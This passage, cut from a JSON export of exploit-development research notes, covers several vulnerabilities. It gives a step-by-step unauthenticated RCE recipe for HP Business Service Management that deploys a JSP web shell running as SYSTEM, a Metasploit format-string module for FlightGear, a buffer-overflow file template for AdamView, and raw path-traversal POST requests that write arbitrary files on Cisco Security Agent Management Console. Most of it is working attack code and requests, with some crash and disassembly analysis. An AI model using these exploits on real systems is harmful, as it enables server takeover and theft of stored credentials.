(!in_array($fext,array('.GIF','.JPG','.JPEG','.PNG')))\n  unlink($watermark_file);\nif (!file_exists($watermark_file)) return false;\n```\n\nSo it looks like the intention of the fix is to check the file extension and make sure the file type is one of these: GIF, JPG, JPEG, and PNG. If there is no match, then it deletes the uploaded file. For the most part, that sounds like a good plan.\n\nA slight concern is that in PHP, you don't always need the file to be `.php` to be able to execute code, in some cases it could be anything. Take the following proof-of-concept for example, I'm creating a PHP file named as \"fake_image.PNG\", and then I include it from a separate file. The `include` will still treat the fake image file as a PHP file anyway:\n\n```bash\nroot@sinn3r-virtual-machine:/var/www/html# echo \"<?php echo 'Hello World'; ?>\" > fake_image.PNG\nroot@sinn3r-virtual-machine:/var/www/html# echo \"<?php include('fake_image.PNG'); ?>\" > demo.php\nroot@sinn3r-virtual-machine:/var/www/html# curl http://localhost/demo.php\nHello World\n```\n\nLuckily for the vendor, the exploit doesn't rely on a `include` to exploit the payload, instead it relies on an HTTP request like this:\n\n```ruby\nprint_status(\"Making request for '/#{fname}' to execute payload.\")\nsend_request_cgi(\n  {\n    'method' => 'GET',\n    'uri' => normalize_uri(target_uri.path, 'uploads', 'images', fname)\n    },\n  15\n  )\n```\n\nHowever, the ability to upload a PHP file with an image extension name is still worth noting from an attacker's perspective, because it potentially be chained in case of a file inclusion vulnerability in the future.\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "96ce1881-212b-4f75-bf71-860aef146aa0",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "0516ee37-46c2-4143-a018-2620e6c806cd",
      "created": "2019-09-12T18:07:51.582086Z",
      "revisionDate": "2020-02-13T17:12:09.299065Z",
      "document": "\n\nDownload Software (version 9.10):\n\nhttp://www8.hp.com/us/en/software-solutions/software.html?compURI=1170773#\n\nQuestion: is 9.10 vulnerable? It\u2019s the one available for download\n\nRemote Code Execution in HP Business Service Management leads to full system compromise (CVE-2012-2561)\n\nHP Business Service Management (HPBSM) is build around the JBoss Application Server. In its standard configuration and when configured according to the HP installations guide, the newest fully patched version 9.12 comes with an open invoker-servlet (/invoker/JMXInvokerServlet does not require authentication) but more importantly, with RMI (port tcp/4444) and JDNI (tcp/1098 and tcp/1099) accessible without authentication. This gives a remote attacker access to the adapter service and therefore access to MBeans of the JBoss AS.\n\nTo exploit the vulnerability, an attacker can remotely deploy an application and call it via RMI. This can be done easily by downloading the official JBoss AS (e.g. jboss-4.2.3.GA) which includes the tool \"twiddle.sh\" in the bin-directory. With this tool, the RMI interface can be (ab-)used as follows to compromise the HPBSM and get code execution:\n\n1. jboss-4.2.3.GA/bin/twiddle.sh -s <servername> get jboss.system:type=ServerInfo\n--> this shows that the interface is accessible and does work\n\n2. create a simple jsp-shell and bundle it as a valid .war file (or use a ready one like http://www.redteam-pentesting.de/files/redteamjboss.tar.gz in the WAR directory)\n--> this will be the shell on the attacked machine\n\n3. create a base64-representation of the war file (e.g. \"base64 -w 0 hpbsm.war >> hpbsm.war.base64\")\n--> this is needed for the deployer script which can only be ascii\n\n4. create a text file without any line breaks as deployer help script \"deployer.bsh\":\n\nimport java.io.FileOutputStream; import sun.misc.BASE64Decoder; String val=\"<insert-hpbsm.war.base64-content>\"; BASE64Decoder decoder = new BASE64Decoder(); byte[] byteval=decoder.decodeBuffer(val); FileOutputStream fs = new FileOutputStream(\"C:\\WINDOWS\\TEMP\\hpbsm.war\"); fs,write(byteval); fs.close();\n\n5. create the remote file (first remote code execution):\njboss-4.2.3.GA/bin/twiddle.sh -s <servername> invoke jboss.deployer:service=BSHDeployer createScriptDeployment \"`cat deployer.bsh`\" deployer.bsh\n--> this creates the war file in C:\\windows\\temp on the remote attacked machine\n\n6. deploy the created file (second remote code execution):\njboss-4.2.3.GA/bin/twiddle.sh -s <servername> invoke jboss.system:service=MainDeployer deploy \"file:C:/WINDOWS/TEMP/hpbsm.war\"\n--> now the attackers jsp-shell is deployed\n\n7. make sure the deployment was successful by looking up your jsp-shell:\nhttp://<servername>:8080/status?full=true\n\n8. call the actual shell (in this case, it's the one from the redteamjboss.tar.gz):\nhttp://<servername>:8080/hpbsm/shell.jsp?pass=secret&cmd=whoami\n--> the output is \"nt/system\" which means that the remote code execution did work and the attacker even has the highest possible system rights because the server process runs as nt/system!\n\nThis works even through firewalled HPBSM installations which are not allowed to make outgoing requests.\n\nSide note: HPBSM is a product that is used to monitor other critical systems. To be able to do that, HPBSM servers need so called \"scripts\" which include clear text credentials for the monitored systems! Therefore, an attacker gains not only full access to the HPBSM server itself but potentially gains accounts and credentials to numerous important systems because in general, monitored systems are important :-)\n\nDavid Elze, 2012-05-21 (vuln found 2012-03-30 & reported 2012-04-02)\n\n\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "107e4e64-c89e-4b88-97b7-0b612a19edb6",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "fcf27bcc-b246-4bcf-93b4-562af2ef234d",
      "created": "2019-09-12T18:07:52.270787Z",
      "revisionDate": "2020-02-13T17:12:09.042757Z",
      "document": "\n\n* Vuln analysis:\n\nIn source code:\n\n```\n  double count = acloud->getDoubleValue(\"count\", 1.0);\n    tCloudVariety[CloudVarietyCount].count = count;\n    int variety = 0;\n    cloud_name = cloud_name + \"-%d\";\n    char variety_name[50];\n    do {\n         variety++;\n         snprintf(variety_name, sizeof(variety_name) - 1, cloud_name.c_str(), variety); // Vulnerable snprintf\n    } while( box_def_root->getChild(variety_name, 0, false) );\n    totalCount += count;\n    if( CloudVarietyCount < 20 )\n         CloudVarietyCount++;\n  }\n}\n\ntotalCount = 1.0 / totalCount;\n```\n\n* PoC:\n\n```\n##\n# This file is part of the Metasploit Framework and may be subject to\n# redistribution and commercial restrictions. Please see the Metasploit\n# web site for more information on licensing and terms of use.\n#   http://metasploit.com/\n##\n\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'FlightGear Format String',\n      'Description'    => %q{\n          This module exploits .....\n      },\n      'Author'         => [ 'juan vazquez' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '92872' ]\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n          'DisableNops'  =>  'true',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'FlightGear',   { 'Ret' => 0x41414141 } ]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => 'Apr 21 2013'))\n\n    register_options([Opt::RPORT(5501)], self.class)\n  end\n\n  def exploit\n    connect\n\n    print_status(\"Trying to send data...\")\n\n    sock.put(\"data\\r\\n\")\n    sock.put(\"set /sim/rendering/clouds3d-enable true\\r\\n\")\n    sock.put(\"set /environment/clouds\\r\\n\")\n    sock.put(\"set /environment/cloudlayers/layers[0]/cu/cloud/name %n\\r\\n\")\n    sock.put(\"set /environment/clouds/layer[0]/coverage cirrus\\r\\n\")\n    sock.put(\"quit\\r\\n\")\n\n    disconnect\n  end\n\nend\n```\n\n\n* Crash Analysis\n\nOn the WIN32 version available here: http://mirrors.ibiblio.org/flightgear/ftp/Windows/Setup%20FlightGear%202.10.0.3.exe\n\nMSVCR100 is used by FlightGear 2.10.0.3, which looks like coming with FormatString Exploitation Protection:\n\n```\nBreakpoint 0 hit\neax=013dfcc4 ebx=022b0ce0 ecx=013df950 edx=00000002 esi=00000001 edi=013df9c4\neip=004a241e esp=013df8f4 ebp=013dfd08 iopl=0         nv up ei ng nz na pe cy\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200287\nfgfs+0xa241e:\n004a241e ff1550e48b00    call    dword ptr [fgfs!std::_Init_locks::operator=+0x6e189 (008be450)] ds:0023:008be450={MSVCR100!_snprintf (78b05c8a)}\n0:000> dd esp\n013df8f4  013dfcc4 00000031 013df988 00000001\n013df904  98706bbe 00000010 00000000 0000000f\n013df914  00000000 3ff00000 00000000 00000000\n013df924  023827c8 00000000 00000000 022a5b10\n013df934  02479808 0089b0b0 00000000 022acfe0\n013df944  00000000 00000000 0230dfd0 252d6e00\n013df954  00000064 021706e8 02170000 00000000\n013df964  0000000f 0223fa40 013dfb98 7c90e900\n0:000> db 013df988\n013df988  25 6e 2d 25 64 00 17 24-03 00 00 00 f8 51 24 02  %n-%d..$.....Q$.\n013df998  05 00 00 00 0f 00 00 00-15 09 8d 00 25 6e 00 00  ............%n..\n013df9a8  00 00 00 00 7e 6f 70 98-00 00 00 00 02 00 00 00  ....~op.........\n013df9b8  0f 00 00 00 f0 f9 3d 01-b8 ac 89 00 00 00 00 00  ......=.........\n013df9c8  00 00 f0 3f 00 10 7e 00-15 09 8d 00 1b 09 8d 00  ...?..~.........\n013df9d8  00 00 00 00 00 00 00 00-0f 00 00 00 00 00 00 00  ................\n013df9e8  a8 f9 23 02 80 fc 3d 01-c4 fa 3d 01 00 af 89 00  ..#...=...=.....\n013df9f8  be 6c 70 98 c4 fa 3d 01-b0 b0 89 00 00 00 00 00  .lp...=.........\n0:000> p\nWARNING: Step/trace thread exited\neax=7ffd9000 ebx=013df98a ecx=013df010 edx=7c90e4f4 esi=c0000417 edi=013df900\neip=7c90e4f4 esp=013df5c0 ebp=013df5d0 iopl=0         nv up ei ng nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200286\nntdll!KiFastSystemCallRet:\n7c90e4f4 c3              ret\n0:000> kb\nChildEBP RetAddr  Args to Child\n013df5bc 7c90de5c 7c801e3a ffffffff c0000417 ntdll!KiFastSystemCallRet\n013df5c0 7c801e3a ffffffff c0000417 013df5fc ntdll!NtTerminateProcess+0xc\n013df5d0 78b2af4f ffffffff c0000417 00000001 kernel32!TerminateProcess+0x20\n013df5e0 78b2af7d 00000000 00000000 00000000 MSVCR100!_invoke_watson+0x23\n013df5fc 78b2af8a 00000000 00000000 00000000 MSVCR100!_invalid_parameter+0x2c\n013df614 78b1c7a3 013df8ec 013dfcc4 00000000 MSVCR100!_invalid_parameter_noinfo+0xc\n013df8a8 78b05d0e 013df8cc 013df988 00000000 MSVCR100!_output_l+0x86\n013df8ec 004a2424 013dfcc4 00000031 013df988 MSVCR100!_snprintf+0x84\nWARNING: Stack unwind information not available. Following frames may be wrong.\n013dfd08 004a2a3c 00000000 013dfd90 00000000 fgfs+0xa2424\n013dfdbc 004a2aed 013dfdfc 0049ed0a 00000004 fgfs+0xa2a3c\n013dfdc4 0049ed0a 00000004 00000004 0c0a3b88 fgfs+0xa2aed\n013dfdfc 007ec98b 7d035c41 3ff4c78a 98706882 fgfs+0x9ed0a\n013dfe34 007ec87a 00000000 3ff00000 00000005 fgfs+0x3ec98b\n013dfe78 007ec432 00000000 3ff00000 008c4230 fgfs+0x3ec87a\n013dfe90 004196ef 00000000 3ff00000 00000000 fgfs+0x3ec432\n013dfeb0 0067d769 98706862 008c4230 0222abc0 fgfs+0x196ef\n013dfed4 0041a067 987069aa 0222abc0 00000004 fgfs+0x27d769\n013dff1c 00402082 00000004 0222abc0 987069ca fgfs+0x1a067\n013dff7c 00850cb3 00000004 0222abc0 02172ee8 fgfs+0x2082\n013dffc0 7c817067 217bc3f4 01cec380 7ffd9000 fgfs!std::_Init_locks::operator=+0x9ec\n013dfff0 00000000 00850dd4 00000000 00905a4d kernel32!BaseProcessStart+0x23\n```\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "8426cbed-0d3e-4262-b5d6-71d6f82f3923",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "19e667a0-a188-43ed-8d8a-8de540e92c7f",
      "created": "2019-09-12T18:07:52.966574Z",
      "revisionDate": "2020-02-13T17:12:08.801474Z",
      "document": "\n\n## Details\n\nAccording to the official advisory there is a trivial bof on adamview.exe (Adamview builder):\n\n```\n.text:00475BA0 push    ebx\n.text:00475BA1 lea     ecx, [esp+4Ch+String1]\n.text:00475BA5 push    offset aDisplayDesigne ; \"Display Designer: %s\"\n.text:00475BAA push    ecx             ; LPSTR\n.text:00475BAB mov     esi, eax\n.text:00475BAD call    ds:wsprintfA\n```\n\nIndeed the overflow is obvious and can be easily reached with GNI with a display designer window\nwith a big name.\n\nInside the file, the designer string is saved as:\n\n2 bytes length / Designer string ending with NULL (0x00)\n\nSince the wsprintf copies the designer name, read from the file, to a stack buffer:\n\n```\n-00000034 String1\n```\n\nIt is trival to trigger the overflow:\n\n```\n  def template\n    gni = [\n      0x41, 0x47, 0x4E, 0x49, 0xAE, 0x01, 0x04, 0x00,\n      0xEA, 0x45, 0x20, 0x78, 0x1E, 0x75, 0xF8, 0x18,\n      0xDC, 0x45, 0x46, 0xC0, 0x06, 0x2D, 0xF0, 0x20,\n      0x92, 0x6D, 0xC0, 0x9C, 0x02, 0x89, 0xF0, 0x44,\n      0x06, 0x4D, 0x00, 0x00, 0x48, 0x45, 0x41, 0x44,\n      0x16, 0x00, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0xFF,\n      0x00, 0x00, 0x00, 0x00, 0x80, 0x02, 0xE0, 0x01,\n      0x53, 0x57, 0x50, 0x4C, 0x30, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF,\n      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,\n      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE4, 0x02,\n      0x00, 0x00, 0x9D, 0x01, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x42, 0x54,\n      0x53, 0x4B, 0x76, 0x00, 0x01, 0x00, 0x00, 0x00,\n      0x2A, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,\n      0x16, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,\n      0x54, 0x41, 0x53, 0x4B, 0x31, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0xC8, 0x42, 0x45, 0x54, 0x53, 0x4B, 0x50, 0x57,\n      0x50, 0x4C, 0x3D, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,\n      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,\n      0xFF, 0xFF, 0xFF, 0xFF, 0x44, 0x00, 0x00, 0x00,\n      0x2D, 0x00, 0x00, 0x00, 0x41, 0x03, 0x00, 0x00,\n      0xCB, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x01,\n      0x00].pack(\"C*\")\n\n    bof = rand_text(target['Offset'])\n    bof << [target.ret].pack(\"V\") # eip\n    bof << rand_text(4) # padding\n    bof << rand_text_alpha_upper(4) # payload\n    bof << \"\\x00\"\n    gni << [bof.length].pack(\"v\")\n    gni << bof\n\n    gni << [0x50, 0x45, 0x4E, 0x44, 0x46, 0x56,\n      0x4B, 0x53, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4E, 0x45,\n      0x54, 0x4B, 0x41, 0x44, 0x41, 0x4D, 0x56, 0x69,\n      0x65, 0x77, 0x00, 0xEC, 0x00, 0x00, 0xD0, 0x07,\n      0xD0, 0x07, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00,\n      0x00, 0x00, 0x5A, 0x45, 0x4F, 0x46\n    ].pack(\"C*\")\n```\n\nUnfortunately, there is a heap overflow, previously to the stack overflow, which makes exploitation\nsuper unstable on Windows 7 SP1 (I guess more modern systems too). The same vulnerable function is used\nto read the designer name from the file:\n\n```\n.text:00475B38 lea     eax, [esp+48h+var_38]\n.text:00475B3C push    2               ; SIZE\n.text:00475B3E push    eax             ; DST\n.text:00475B3F mov     ecx, esi\n.text:00475B41 call    dword ptr [edx+3Ch] ; MFC42!CFile::Read, it's reading the size\n.text:00475B44 mov     eax, [esp+48h+var_38]\n.text:00475B48 mov     edx, [esi]      ; {MFC42!CFile::`vftable'} => [esi]\n.text:00475B4A and     eax, 0FFFFh\n.text:00475B4F mov     ecx, esi\n.text:00475B51 push    eax             ; size\n.text:00475B52 push    ebx             ; dst\n.text:00475B53 call    dword ptr [edx+3Ch] ; MFC42!CFile::Read\n.text:00475B56 push    ebx             ; Str\n.text:00475B57 call    ds:_strupr      ; uppercase\n```\n\nFirst 2 bytes are read from the file, and stored in the stack. It is the Designer string length.\n\nAfter it, this length size is read from the file and stored in the memory pointed by ebx:\n\n```\n00475B24 lea     ebx, [edi+2F1h]\n```\n\nebx pointes to an offset inside edi, which points to a buffer in the heap. Where this heap buffer\ncomes from from?:\n\n```\n0:000> !heap -p -a 08af2ec9\n    address 08af2ec9 found in\n    _DPH_HEAP_ROOT @ 1a21000\n    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)\n                                 8aa12a4:          8af2bd8              428 -          8af2000             2000\n          ? ADAMView!DlgProc+1d4c8\n    732b8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229\n    77355e26 ntdll!RtlDebugAllocateHeap+0x00000030\n    7731a376 ntdll!RtlpAllocateHeap+0x000000c4\n    772e5ae0 ntdll!RtlAllocateHeap+0x0000023a\n    75db9d45 msvcrt!malloc+0x0000008d\n    6f5eff9e MFC42!operator new+0x00000015\n    00474790 ADAMView!ColorBox::ColorBoxDlgSubclassProc+0x00014ac0\n    6f5ffef3 MFC42!CFrameWnd::CreateView+0x00000017\n    6f5ffec6 MFC42!CFrameWnd::OnCreateClient+0x0000001c\n    6f600ac3 MFC42!CFrameWnd::OnCreateHelper+0x00000031\n    6f600a8e MFC42!CMDIChildWnd::OnCreate+0x00000014\n    6f5feadb MFC42!CWnd::OnWndMsg+0x00000272\n    6f5f3687 MFC42!CWnd::WindowProc+0x0000002e\n    6f5fa361 MFC42!AfxCallWndProc+0x000000b5\n    6f5fa2b9 MFC42!AfxWndProc+0x0000003e\n    6f5fa571 MFC42!AfxWndProcBase+0x00000057\n    75a0c4e7 USER32!InternalCallWinProc+0x00000023\n    75a05f9f USER32!UserCallWinProcCheckWow+0x000000e0\n    75a04f0e USER32!DispatchClientMessage+0x000000da\n    759fe98a USER32!__fnINLPCREATESTRUCT+0x0000008b\n    772d6fee ntdll!KiUserCallbackDispatcher+0x0000002e\n    759fec54 USER32!_CreateWindowEx+0x00000201\n    759fbf73 USER32!CreateWindowExA+0x00000033\n    75a1f67c USER32!MDIClientWndProcWorker+0x000003b7\n    75a22bca USER32!MDIClientWndProcA+0x00000022\n    75a0c4e7 USER32!InternalCallWinProc+0x00000023\n    75a0c5e7 USER32!UserCallWinProcCheckWow+0x0000014b\n    75a05294 USER32!SendMessageWorker+0x000004d0\n    759fada9 USER32!SendMessageA+0x0000007c\n    6f600a10 MFC42!CMDIChildWnd::Create+0x000000fe\n    6f6000dc MFC42!CMDIChildWnd::LoadFrame+0x000000c7\n    6f60120e MFC42!CDocTemplate::CreateNewFrame+0x00000067\n```\n\nIt's a 0x428 buffer allocated on sub_474770\n\n```\n.text:0047477D push    eax\n.text:0047477E mov     large fs:0, esp\n.text:00474785 push    ecx\n.text:00474786 push    428h            ; unsigned int\n.text:0047478B call    ??2@YAPAXI@Z    ; operator new\n```\n\nSince the string read from the file is copied to offset 0x271, it lefts 311 bytes before\nthe heap buffer is overflowed.\n\nUnfortunately, just after read the string from the file and store it in the heap, it happens:\n\n```\n.text:00475B53 call    dword ptr [edx+3Ch] ; MFC42!CFile::Read\n.text:00475B56 push    ebx             ; Str\n.text:00475B57 call    ds:_strupr      ; uppe\n```\n\nThe string in the heap is converted to uppercase. It means a lot of \"badchars\". So overflowing\nEIP and storing the payload on 311 bytes doesn't look feasible (at least usign the upper\nencoder).\n\nOf course, we can overflow the heap and pry for the execution to reach the stack overflow and\nthe ret. Unfortunately too many things happen between the heap and the stack overflow:\n\n```\n.text:00475B57                 call    ds:_strupr      ; uppercase\n.text:00475B5D                 add     esp, 4\n.text:00475B60                 lea     ecx, [esp+48h+String1]\n.text:00475B64                 push    ebx             ; lpString2\n.text:00475B65                 push    ecx             ; lpString1\n.text:00475B66                 call    ds:lstrcmpA\n.text:00475B6C                 test    eax, eax\n.text:00475B6E                 jz      short loc_475B80\n.text:00475B70                 lea     edx, [esp+48h+String1]\n.text:00475B74                 push    ebx             ; char *\n.text:00475B75                 push    edx             ; char *\n.text:00475B76                 mov     ecx, offset unk_4BEEA8 ; this\n.text:00475B7B                 call    ?ChangeTaskName@CDBCenter@@QAEKPBD0@Z ; CDBCenter::ChangeTaskName(char const *,char const *)\n.text:00475B80\n.text:00475B80 loc_475B80:                             ; CODE XREF: sub_475AA0+CEj\n.text:00475B80                 mov     eax, [esi]\n.text:00475B82                 push    0\n.text:00475B84                 push    ebp\n.text:00475B85                 mov     ecx, esi\n.text:00475B87                 call    dword ptr [eax+30h]\n.text:00475B8A                 push    esi             ; hMem\n.text:00475B8B                 mov     ecx, edi\n.text:00475B8D                 call    sub_479950\n.text:00475B92                 mov     ecx, edi\n.text:00475B94                 call    sub_475980\n.text:00475B99                 mov     ecx, edi        ; this\n.text:00475B9B                 call    ?GetParentFrame@CWnd@@QBEPAVCFrameWnd@@XZ ; CWnd::GetParentFrame(void)\n.text:00475BA0                 push    ebx\n.text:00475BA1                 lea     ecx, [esp+4Ch+String1]\n.text:00475BA5                 push    offset aDisplayDesigne ; \"Display Designer: %s\"\n.text:00475BAA                 push    ecx             ; LPSTR\n.text:00475BAB                 mov     esi, eax\n.text:00475BAD                 call    ds:wsprintfA\n```\n\nOn windows 7 SP1 the heap is used between the overflows, and the corrupted heap makes the process to crash before\nreaching the stack overflow and control EIP later.\n\nAlso egghunting doesn't look a good option, because all the file contents aren't in memory at the moment of the overflow.\n\nSo for example adding the payload as garbage at the end of the file, results with the payload not in memory when\ncontrolling EIP :\\...\n\nEven when the HEAP overflow isn't reported in the core advisory, and there are probably a lot of other vulnerabilities,\nthe software is unsupported atm. Even the CORE vuln wasn't fixed, so I don't think it's worth to invest more time here.\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "cd6f254f-254a-4c5d-86c3-0a091af9207c",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "d4fe00e6-d79d-49ae-8dcd-e11786fa5bc7",
      "created": "2019-09-12T18:07:53.703187Z",
      "revisionDate": "2020-02-13T17:12:08.554063Z",
      "document": "\n\nThis vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Cisco Security Agent Management Console.  Authentication is not required to exploit this vulnerability.\n\nThe flaw exists within the webagent.exe component which is handed requests by an Apache instance that listens by default on TCP port 443.  When handling an st_upload request the process does not properly validate POST parameters used for a file creation. The contents of this newly created file are controllable via another POST variable. A remote attacker can exploit this vulnerability to execute arbitrary code under\nthe context of the SYSTEM user.\n\nExploit:\n\nhttp://downloads.securityfocus.com/vulnerabilities/exploits/46420.py\n\n\n# Installation\n\nI've done two installations, both in W2003 SP2 (W2003 is the supported\noperating system):\n\n* fcs-csamc-hotfix-5.1.0.117-w2k3-k9.zip\n* fcs-csamc-hotfix-6.0.0.220-w2k3-k9.zip\n\nBoth versions can be easily found in Internet googling by the filename.\n\n# Testing the PoC\n\nThe PoC doesn't work for me in 5.1.0.117. Reasons\n\n(1) The path and the parameteres. It can be easily fixed...\n\nPoC request modified to write arbitrary contents to arbitrary file:\n\n```\nPOST /csamc51/agent HTTP/1.1\nHost: localhost\nConnection: keep-alive\nUser-Agent: Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Encoding: gzip,deflate,sdch\nAccept-Language: en-US,en;q=0.8\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\nContent-type: multipart/form-data; boundary=172.16.240.1.501.72115.1350048178.818.1\nContent-Length: 786\n\n--172.16.240.1.501.72115.1350048178.818.1\nContent-Disposition: form-data; name=\"host_uid\"\n\nF0888900-ACF9-4728-8F20-08B3E5BBA3AD\n--172.16.240.1.501.72115.1350048178.818.1\nContent-Disposition: form-data; name=\"extension\"\n\n/../../../../../../../../../../../../test.txt\n--172.16.240.1.501.72115.1350048178.818.1\nContent-Disposition: form-data; name=\"jobname\"\n\n\n--172.16.240.1.501.72115.1350048178.818.1\nContent-Disposition: form-data; name=\"diagsu\"\n\nasdfafdsasdffdasdfsaadfsadsfadsfdafsadsf\nasdfasdfadsfadfssdfasd\nfsadadfsadsfsdafafsd\n--172.16.240.1.501.72115.1350048178.818.1\nContent-Disposition: form-data; name=\"host\"\n\n1234\n--172.16.240.1.501.72115.1350048178.818.1\nContent-Disposition: form-data; name=\"profiler\"\n\n\n--172.16.240.1.501.72115.1350048178.818.1--\n```\n\nAfter reversing, other paths can be used to write arbitrary contents to arbitrary files, as sample:\n\n```\nPOST /csamc51/agent HTTP/1.1\nHost: localhost\nConnection: keep-alive\nUser-Agent: Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Encoding: gzip,deflate,sdch\nAccept-Language: en-US,en;q=0.8\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\nContent-type: multipart/form-data; boundary=172.16.240.1.501.72115.1350048178.818.1\nContent-Length: 846\n\n--172.16.240.1.501.72115.1350048178.818.1\nContent-Disposition: form-data; name=\"host_uid\"\n\nF0888900-ACF9-4728-8F20-08B3E5BBA3AD\n--172.16.240.1.501.72115.1350048178.818.1\nContent-Disposition: form-data; name=\"extension\"\n\n/../../../../../../../../../../../../test.txt\n--172.16.240.1.501.72115.1350048178.818.1\nContent-Disposition: form-data; name=\"jobname\"\n\n\n--172.16.240.1.501.72115.1350048178.818.1\nContent-Disposition: form-data; name=\"diagsu\"\n\n\n--172.16.240.1.501.72115.1350048178.818.1\nContent-Disposition: form-data; name=\"diags\"\n\n\n--172.16.240.1.501.72115.1350048178.818.1\nContent-Disposition: form-data; name=\"host\"\n\n1234\n--172.16.240.1.501.72115.1350048178.818.1\nContent-Disposition: form-data; name=\"profiler\"\n\nOptions +Includes +ExecCGI\nAddHandler cgi-script gee\n--172.16.240.1.501.72115.1350048178.818.1--\n```\n\n(2) the host uid\n\nIts the major reason which makes the PoC fail, the PoC use a hardcoded host uid\nto do its requests:\n\n```\n_host_uid = 'C087EFAE-05A2-4A0B-9512-E05E5ED84AEB'\n```\n\nThe host uid identifies a cisco agent and is generated while registration of the\nagent with the management console.\n\nBoth versions, 5.1.0.117 and 6.0.0.220 check the host uid and doesn't allow\nto upload files if it isn't a registered uid:\n\nVersion 5.1.0.117\n\n* The host uid fields is read and a pointer stored on host_uid_var_1364:\n\n```\n.text:004847F9                 mov     ecx, [ebp+var_1378]\n.text:004847FF                 mov     ebx, [ecx]\n.text:00484801                 mov     edi, offset aHost_uid ; \"host_uid\"\n.text:00484806                 mov     esi, ebx\n.text:00484808                 mov     ecx, 9\n.text:0048480D                 xor     edx, edx\n.text:0048480F                 repe cmpsb\n.text:00484811                 jnz     short loc_48482C\n.text:00484813                 mov     eax, [ebp+var_132C]\n.text:00484819                 mov     eax, [eax]\n.text:0048481B                 call    sub_47AB50\n.text:00484820                 mov     [ebp+host_uid_var_1364], eax\n.text:00484826                 mov     eax, [ebp+var_132C]\n```\n\n* Later the Host ID is checked\n\n```\n.text:00484C19 loc_484C19:                             ; CODE XREF: sub_484350+7A3\u0018j\n.text:00484C19                 